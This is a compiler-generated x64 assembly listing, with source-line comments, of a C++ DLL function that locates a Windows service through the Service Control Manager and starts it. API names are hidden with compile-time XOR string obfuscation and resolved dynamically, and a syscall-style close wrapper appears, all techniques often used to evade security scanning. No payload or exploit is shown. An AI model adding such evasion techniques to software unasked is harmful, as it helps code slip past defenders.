; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rax
	lea	rcx, QWORD PTR $T13[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, r12
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	r15, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN177@StartWindo

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN191@StartWindo

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN188@StartWindo

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN191@StartWindo:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN177@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 250  : 	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN398@StartWindo
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rsi+rbx+13], 445		; 000001bdH
	mov	DWORD PTR [rsi+rbx], 1807903502		; 6bc26b0eH
	mov	DWORD PTR [rsi+rbx+4], 1762717285	; 6910ee65H
	mov	DWORD PTR [rsi+rbx+8], 2092987947	; 7cc0762bH
	mov	BYTE PTR [rsi+rbx+12], 70		; 00000046H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 250  : 	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN398@StartWindo:
	lea	r9, QWORD PTR [rbx+rsi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [r9+14], 0
	je	$LN210@StartWindo

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	edx, edx
	cmp	r14d, 5
	jl	$LN444@StartWindo

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm2, XMMWORD PTR __xmm@1b75bd1119a31f5d1b75bd1119a31f5d
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [r9]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [r9+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [r9+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [r9+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	edx, 8
$LN444@StartWindo:
	mov	r10, 1978695492441415517		; 1b75bd1119a31f5dH
	npad	5
$LL440@StartWindo:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, dl
	and	cl, 7
	shl	cl, 3
	mov	r8, r10
	shr	r8, cl
	xor	BYTE PTR [rdx+r9], r8b

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	rdx
	cmp	rdx, 14
	jb	SHORT $LL440@StartWindo

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r9+14], 0
$LN210@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 250  : 	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	mov	rdx, r9
	lea	rcx, QWORD PTR $T14[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rbx, rax
	mov	QWORD PTR $T4[rsp], rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rax
	lea	rcx, QWORD PTR $T15[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, r12
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	r14, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN238@StartWindo

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN252@StartWindo

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN249@StartWindo

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN252@StartWindo:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN238@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	xor	r12d, r12d
	mov	QWORD PTR [rbx+16], r12

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], r12b
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 252  : 	SC_HANDLE scManager = pOpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);

	mov	r8d, 536870912				; 20000000H
	lea	rdx, OFFSET FLAT:??_C@_1BO@JHOJBCBI@?$AAS?$AAe?$AAr?$AAv?$AAi?$AAc?$AAe?$AAs?$AAA?$AAc?$AAt?$AAi?$AAv?$AAe@
	xor	ecx, ecx
	call	r13
	mov	rsi, rax

; 253  : 	if ( scManager == NULL )

	test	rax, rax
	jne	SHORT $LN5@StartWindo
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN276@StartWindo

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN290@StartWindo

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN287@StartWindo

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN290@StartWindo:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN276@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], r12

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 254  : 		return -1;

	jmp	$LN447@StartWindo
$LN5@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	rdx, rdi

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdi+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN300@StartWindo

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdi]
$LN300@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 256  : 	SC_HANDLE service = pOpenServiceA(scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE);

	mov	r8d, -1610612736			; a0000000H
	mov	rcx, rsi
	call	QWORD PTR $T1[rsp]
	mov	rbx, rax

; 257  : 	if ( service == NULL ) {

	test	rax, rax
	je	SHORT $LN450@StartWindo
	xorps	xmm0, xmm0

; 258  : 		SysNtClose(scManager);
; 259  : 		return -1;
; 260  : 	}
; 261  : 
; 262  : 	SERVICE_STATUS_PROCESS status = { 0 };

	xor	eax, eax
	movups	XMMWORD PTR status$[rbp-256], xmm0
	movups	XMMWORD PTR status$[rbp-240], xmm0
	mov	DWORD PTR status$[rbp-224], eax
	mov	r12d, 10000				; 00002710H
$LL4@StartWindo:

; 263  : 	DWORD statusBytesNeeded;
; 264  : 
; 265  : 	// query and attempt to start, wait if stop pending, until service running
; 266  : 	do {
; 267  : 		// query the service status
; 268  : 		if ( !pQueryServiceStatus(

	lea	rax, QWORD PTR statusBytesNeeded$[rbp-256]
	mov	QWORD PTR [rsp+32], rax
	mov	r9d, 36					; 00000024H
	lea	r8, QWORD PTR status$[rbp-256]
	xor	edx, edx
	mov	rcx, rbx
	call	r15
	test	eax, eax
	je	$LN314@StartWindo

; 277  : 			return -1;
; 278  : 		}
; 279  : 
; 280  : 		// check if stop pending
; 281  : 		if ( status.dwCurrentState == SERVICE_STOP_PENDING || status.dwCurrentState == SERVICE_START_PENDING ) {

	mov	ecx, DWORD PTR status$[rbp-252]
	lea	eax, DWORD PTR [rcx-2]
	cmp	eax, 1
	jbe	SHORT $LN9@StartWindo

; 292  : 			continue;
; 293  : 		}
; 294  : 		// service is not running
; 295  : 		if ( status.dwCurrentState == SERVICE_STOPPED ) {

	cmp	ecx, 1
	jne	SHORT $LN2@StartWindo

; 296  : 			BOOL serviceStarted = pStartService(service, 0, NULL);

	xor	r8d, r8d
	xor	edx, edx
	mov	rcx, rbx
	call	r14

; 297  : 			if ( !serviceStarted ) {

	test	eax, eax
	jne	SHORT $LN449@StartWindo

; 298  : 				SysNtClose(service);

	mov	rcx, rbx
	call	SysNtClose
$LN450@StartWindo:

; 309  : }

	mov	rcx, rsi
	jmp	SHORT $LN448@StartWindo
$LN9@StartWindo:

; 282  : 			// wait until service is stopped 
; 283  : 
; 284  : 			// recommended wait time based on microsoft win32 docs
; 285  : 			int wait = status.dwWaitHint / 10;

	mov	eax, -858993459				; cccccccdH
	mul	DWORD PTR status$[rbp-232]
	shr	edx, 3

; 286  : 
; 287  : 			if ( wait < 1000 )

	cmp	edx, 1000				; 000003e8H
	jge	SHORT $LN10@StartWindo

; 288  : 				wait = 1000;

	mov	edx, 1000				; 000003e8H
	jmp	SHORT $LN12@StartWindo
$LN10@StartWindo:

; 289  : 			else if ( wait > 10000 )

	cmp	edx, r12d
	cmovg	edx, r12d
$LN12@StartWindo:

; 290  : 				wait = 10000;
; 291  : 			Sleep(wait);

	mov	ecx, edx
	call	QWORD PTR __imp_Sleep
$LN449@StartWindo:

; 299  : 				SysNtClose(scManager);
; 300  : 				return -1;
; 301  : 			}
; 302  : 		}
; 303  : 	} while ( status.dwCurrentState != SERVICE_RUNNING );

	mov	ecx, DWORD PTR status$[rbp-252]
$LN2@StartWindo:
	cmp	ecx, 4
	jne	$LL4@StartWindo

; 304  : 
; 305  : 	// service is now started
; 306  : 	SysNtClose(service);

	mov	rcx, rbx
	call	SysNtClose

; 307  : 	SysNtClose(scManager);

	mov	rcx, rsi
	call	SysNtClose

; 308  : 	return status.dwProcessId;

	mov	ebx, DWORD PTR status$[rbp-228]
	mov	rcx, rdi
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, ebx
	jmp	SHORT $LN1@StartWindo
$LN314@StartWindo:

; 269  : 			service,
; 270  : 			SC_STATUS_PROCESS_INFO,
; 271  : 			( LPBYTE ) &status,
; 272  : 			sizeof(SERVICE_STATUS_PROCESS),
; 273  : 			&statusBytesNeeded
; 274  : 		) ) {
; 275  : 			SysNtClose(scManager);

	mov	rcx, rsi
	call	SysNtClose

; 276  : 			SysNtClose(service);

	mov	rcx, rbx
$LN448@StartWindo:

; 309  : }

	call	SysNtClose
	npad	1
	mov	rcx, rdi
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN447@StartWindo:
	mov	eax, -1					; ffffffffH
$LN1@StartWindo:
	mov	rcx, QWORD PTR __$ArrayPad$[rbp-256]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+464]
	mov	rbx, QWORD PTR [r11+56]
	mov	rsi, QWORD PTR [r11+64]
	mov	rdi, QWORD PTR [r11+72]
	movaps	xmm6, XMMWORD PTR [r11-16]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
$LN287@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN73@StartWindo:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN135@StartWindo:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN188@StartWindo:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN249@StartWindo:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN446@StartWindo:
?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::StartWindowsService
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$0@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$0
	mov	rcx, QWORD PTR serviceName$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$6
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$6@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$6
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$7@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$7
	mov	rcx, QWORD PTR $T2[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$7@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$7
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$10
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$10@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$10
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
